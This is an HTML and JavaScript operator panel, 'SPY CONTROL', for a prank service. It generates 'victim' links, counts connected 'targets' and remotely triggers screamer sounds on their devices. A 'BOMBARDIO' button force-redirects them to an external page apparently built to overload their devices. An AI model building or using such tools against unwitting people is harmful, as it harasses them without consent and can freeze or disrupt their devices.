<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SPY CONTROL v9.2 FINAL</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon: #00f2ff;
            --neon-glow: rgba(0, 242, 255, 0.3);
            --danger: #ff0044;
            --bg-1: #050508;
            --bg-2: #0d1117;
            --bg-3: #0a0612;
            --card-bg: rgba(15, 15, 20, 0.9);
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'JetBrains Mono', monospace;
            color: #e0e0e0;
            /* –ê–Ω—ñ–º–æ–≤–∞–Ω–∏–π –ø—Ä–∏–≥–ª—É—à–µ–Ω–∏–π –≥—Ä–∞–¥—ñ—î–Ω—Ç */
            background: linear-gradient(135deg, var(--bg-1), var(--bg-2), var(--bg-3));
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
            overflow-x: hidden;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            width: 92%;
            max-width: 440px;
            background: var(--card-bg);
            padding: 30px 20px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
            position: relative;
        }

        h1 {
            font-family: 'Orbitron';
            font-size: 22px;
            text-align: center;
            color: var(--neon);
            letter-spacing: 3px;
            margin: 0 0 25px 0;
            text-shadow: 0 0 10px var(--neon-glow);
        }

        /* –ê–¥–∞–ø—Ç–∏–≤–Ω–∞ –º–æ–≤–Ω–∞ –ø–∞–Ω–µ–ª—å */
        .lang-bar {
            display: flex;
            justify-content: center;
            gap: 6px;
            margin-bottom: 25px;
        }
        .lang-btn {
            flex: 1;
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.1);
            color: #666;
            padding: 10px 0;
            font-family: 'Orbitron';
            font-size: 10px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
        }
        .lang-btn.active {
            color: var(--neon);
            border-color: var(--neon);
            background: rgba(0, 242, 255, 0.05);
        }

        /* –°—Ç–∏–ª—å –ø–æ–ª—ñ–≤ –≤–≤–æ–¥—É */
        .input-box { margin-bottom: 20px; position: relative; }
        .input-label {
            font-size: 10px;
            color: var(--neon);
            text-transform: uppercase;
            margin-bottom: 8px;
            display: block;
            opacity: 0.8;
        }
        input[type="text"] {
            width: 100%;
            background: #000;
            border: 1px solid #222;
            padding: 14px;
            color: #fff;
            font-size: 15px; /* –ó–∞–ø–æ–±—ñ–≥–∞—î –∑—É–º—É –Ω–∞ iPhone */
            border-radius: 10px;
            outline: none;
            transition: 0.3s;
        }
        input[type="text"]:focus { border-color: var(--neon); }

        .input-wrapper { display: flex; gap: 8px; }

        /* –¢—Ä–∏ —Å–º—É–∂–∫–∏ (–ì–∞–º–±—É—Ä–≥–µ—Ä-–∫–Ω–æ–ø–∫–∞) */
        .sound-menu-btn {
            background: var(--neon);
            color: #000;
            border: none;
            min-width: 55px;
            height: 50px;
            border-radius: 10px;
            font-size: 20px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 0 15px var(--neon-glow);
        }

        .sound-dropdown {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            width: 100%;
            background: #111;
            border: 1px solid var(--neon);
            border-radius: 10px;
            z-index: 1000;
            margin-top: 5px;
            max-height: 250px;
            overflow-y: auto;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }

        .sound-item {
            padding: 15px;
            border-bottom: 1px solid #222;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
        }
        .sound-item:active { background: var(--neon); color: #000; }

        /* –ö–Ω–æ–ø–∫–∏ */
        .main-btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 12px;
            font-family: 'Orbitron';
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
        }
        .btn-create {
            background: var(--neon);
            color: #000;
            box-shadow: 0 5px 15px var(--neon-glow);
        }
        .btn-update {
            background: transparent;
            color: var(--neon);
            border: 1px solid var(--neon);
            margin-top: 15px;
        }

        .btn-scare {
            background: #1a1a1a;
            color: #444;
            height: 75px;
            font-size: 20px;
            margin-top: 20px;
        }
        .btn-scare.ready {
            background: var(--danger);
            color: #fff;
            box-shadow: 0 0 20px rgba(255, 0, 68, 0.4);
            cursor: pointer;
        }

        #users-status {
            text-align: center;
            font-size: 12px;
            color: var(--neon);
            margin: 15px 0;
            font-weight: bold;
        }

        .link-box {
            background: #000;
            padding: 12px;
            border-radius: 8px;
            border: 1px dashed #333;
            margin-bottom: 20px;
            text-align: center;
            word-break: break-all;
        }
        .link-box a { color: var(--neon); text-decoration: none; font-size: 11px; }

        /* –ú–æ–±—ñ–ª—å–Ω–∞ –∞–¥–∞–ø—Ç–∞—Ü—ñ—è */
        @media (max-width: 480px) {
            .container { width: 95%; padding: 25px 15px; }
            h1 { font-size: 18px; }
            .main-btn { padding: 16px; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="lang-bar">
        <button class="lang-btn" id="lang-uk" onclick="changeLang('uk')">UA</button>
        <button class="lang-btn" id="lang-ru" onclick="changeLang('ru')">RU</button>
        <button class="lang-btn" id="lang-en" onclick="changeLang('en')">EN</button>
        <button class="lang-btn" id="lang-ja" onclick="changeLang('ja')">JP</button>
    </div>

    <h1 id="t-title">üëÅÔ∏è SPY CONTROL</h1>

    <div id="setup-step">
        <div class="input-box">
            <label id="t-l-img" class="input-label">Media (Image URL)</label>
            <input type="text" id="imgUrl" placeholder="https://...">
        </div>

        <div class="input-box">
            <label id="t-l-snd" class="input-label">Audio (Sound URL)</label>
            <div class="input-wrapper">
                <input type="text" id="sndUrl" value="https://www.myinstants.com/media/sounds/safonov-oplatit.mp3">
                <button class="sound-menu-btn" onclick="toggleM('create')">‚ò∞</button>
                <div id="drop-create" class="sound-dropdown"></div>
            </div>
        </div>

        <button class="main-btn btn-create" onclick="createLink()" id="t-btn-create">–°–¢–í–û–†–ò–¢–ò –ü–ê–°–¢–ö–£</button>
    </div>

    <div id="control-panel" style="display:none;">
        <div class="link-box"><a id="victim-link" href="#" target="_blank">...</a></div>
        
        <div class="input-box">
            <label id="t-u-title" class="input-label">Live Update:</label>
            <input type="text" id="updImgUrl" placeholder="New Image URL" style="margin-bottom: 8px;">
            <div class="input-wrapper">
                <input type="text" id="updSndUrl" placeholder="New Sound URL">
                <button class="sound-menu-btn" onclick="toggleM('update')">‚ò∞</button>
                <div id="drop-update" class="sound-dropdown"></div>
            </div>
            <button class="main-btn btn-update" onclick="updateMedia()" id="t-btn-update">–û–ù–û–í–ò–¢–ò</button>
        </div>

        <div id="users-status">SCANNING FOR TARGETS...</div>
        <button id="scare-btn" class="main-btn btn-scare" onclick="trigger()" disabled>SCARE üíÄ</button>
        <button id="bomb-btn" class="main-btn" onclick="bombardio()" style="background:none; border:1px solid var(--danger); color:var(--danger); opacity:0.3;" disabled>‚ò¢ BOMBARDIO</button>

        <button onclick="location.reload()" style="background:none;color:#555;border:none;width:100%;margin-top:20px;cursor:pointer;font-size:10px;">[ TERMINATE SESSION ]</button>
    </div>
</div>

<audio id="p-audio"></audio>

<script src="/socket.io/socket.io.js"></script>
<script>
    const socket = io();
    let currentRoom = null;

    const sounds = [
        { n: "–û–ø–ª–∞—Ç–∏—Ç—å!", u: "https://www.myinstants.com/media/sounds/safonov-oplatit.mp3" },
        { n: "–ß—É–≥—É–Ω", u: "https://www.myinstants.com/media/sounds/chugun.mp3" },
        { n: "–î–ü–° –ö—Ä—è–∫", u: "https://www.myinstants.com/media/sounds/kriakalka-dps-no-2.mp3" },
        { n: "–°–∫—Ä–∏–º–µ—Ä", u: "https://www.myinstants.com/media/sounds/scream_horror1.mp3" },
        { n: "–°—Ç–æ–Ω—ã", u: "https://www.myinstants.com/media/sounds/shkola.mp3" },
        { n: "–ü–µ—Ä–¥–µ–∂", u: "https://www.myinstants.com/media/sounds/perdezh-700.mp3" }
    ];

    function render() {
        ['create', 'update'].forEach(mode => {
            const box = document.getElementById(`drop-${mode}`);
            const targetInput = mode === 'create' ? 'sndUrl' : 'updSndUrl';
            box.innerHTML = sounds.map(s => `
                <div class="sound-item" onclick="pick('${targetInput}', '${s.u}', 'drop-${mode}')">
                    <span>${s.n}</span>
                    <span style="color:var(--neon)" onclick="play('${s.u}', event)">‚ñ∂</span>
                </div>
            `).join('');
        });
    }

    function toggleM(id) {
        const el = document.getElementById(`drop-${id}`);
        const isVisible = el.style.display === 'block';
        document.querySelectorAll('.sound-dropdown').forEach(d => d.style.display = 'none');
        el.style.display = isVisible ? 'none' : 'block';
    }

    function pick(input, url, drop) {
        document.getElementById(input).value = url;
        document.getElementById(drop).style.display = 'none';
    }

    function play(url, e) {
        e.stopPropagation();
        const a = document.getElementById('p-audio');
        a.src = url; a.play();
    }

    const langs = {
        uk: { t: "üëÅÔ∏è SPY CONTROL", c: "–°–¢–í–û–†–ò–¢–ò –ü–ê–°–¢–ö–£", img: "–ó–û–ë–†–ê–ñ–ï–ù–ù–Ø (URL)", snd: "–ó–í–£–ö (URL)", u: "–û–ù–û–í–ò–¢–ò", ut: "LIVE –û–ù–û–í–õ–ï–ù–ù–Ø:" },
        ru: { t: "üëÅÔ∏è SPY CONTROL", c: "–°–û–ó–î–ê–¢–¨ –õ–û–í–£–®–ö–£", img: "–ò–ó–û–ë–†–ê–ñ–ï–ù–ò–ï (URL)", snd: "–ó–í–£–ö (URL)", u: "–û–ë–ù–û–í–ò–¢–¨", ut: "LIVE –û–ë–ù–û–í–õ–ï–ù–ò–ï:" },
        en: { t: "üëÅÔ∏è SPY CONTROL", c: "CREATE TRAP", img: "IMAGE URL", snd: "SOUND URL", u: "UPDATE", ut: "LIVE UPDATE:" },
        ja: { t: "üëÅÔ∏è „Çπ„Éë„Ç§ÁÆ°ÁêÜ", c: "„Éà„É©„ÉÉ„Éó‰ΩúÊàê", img: "ÁîªÂÉèURL", snd: "Èü≥Â£∞URL", u: "Êõ¥Êñ∞", ut: "„É©„Ç§„ÉñÊõ¥Êñ∞:" }
    };

    function changeLang(l) {
        localStorage.setItem('lang', l);
        document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
        document.getElementById('lang-' + l).classList.add('active');
        const d = langs[l];
        document.getElementById('t-title').innerText = d.t;
        document.getElementById('t-btn-create').innerText = d.c;
        document.getElementById('t-l-img').innerText = d.img;
        document.getElementById('t-l-snd').innerText = d.snd;
        document.getElementById('t-btn-update').innerText = d.u;
        document.getElementById('t-u-title').innerText = d.ut;
    }

    async function createLink() {
        const res = await fetch('/create', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ image: document.getElementById('imgUrl').value, sound: document.getElementById('sndUrl').value })
        });
        const data = await res.json();
        currentRoom = data.id;
        document.getElementById('setup-step').style.display = 'none';
        document.getElementById('control-panel').style.display = 'block';
        const link = `${window.location.origin}/victim.html?id=${data.id}`;
        document.getElementById('victim-link').href = link;
        document.getElementById('victim-link').innerText = link;
        socket.emit('join-room-admin', data.id);
    }

    async function updateMedia() {
        await fetch(`/update-session/${currentRoom}`, {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ image: document.getElementById('updImgUrl').value, sound: document.getElementById('updSndUrl').value })
        });
    }

    function trigger() { socket.emit('trigger-scare', currentRoom); }
    function bombardio() { socket.emit('trigger-redirect', { roomId: currentRoom, url: "https://prank-nfc.onrender.com/volumeshader_bm.html" }); }

    socket.on('update-victim-list', (u) => {
        const s = document.getElementById('scare-btn');
        const b = document.getElementById('bomb-btn');
        const status = document.getElementById('users-status');
        if (u.length > 0) {
            s.disabled = false; s.classList.add('ready');
            b.disabled = false; b.style.opacity = "1";
            status.innerHTML = `TARGETS CONNECTED: ${u.length}`;
        } else {
            s.disabled = true; s.classList.remove('ready');
            b.disabled = true; b.style.opacity = "0.3";
            status.innerText = `WAITING FOR TARGETS...`;
        }
    });

    window.onload = () => {
        changeLang(localStorage.getItem('lang') || 'uk');
        render();
    };

    window.onclick = (e) => {
        if (!e.target.closest('.sound-menu-btn')) {
            document.querySelectorAll('.sound-dropdown').forEach(d => d.style.display = 'none');
        }
    };
</script>
</body>
</html>
